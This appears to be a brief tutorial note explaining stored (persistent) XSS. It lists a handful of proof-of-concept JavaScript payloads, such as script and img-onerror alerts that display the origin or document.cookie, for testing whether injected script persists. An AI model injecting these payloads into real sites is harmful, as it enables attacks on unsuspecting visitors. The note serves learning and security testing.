The first and most critical type of XSS vulnerability is `Stored XSS` or `Persistent XSS`. If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.


Payloads

```javascript
<script>alert(window.origin)</script>

<plaintext>

<script>print()</script>

<script>alert(document.cookie)</script>

<img src="" onerror=alert(window.origin)>
```


If the alert comes back again on refresh then yes thats a stored / persistent XXS
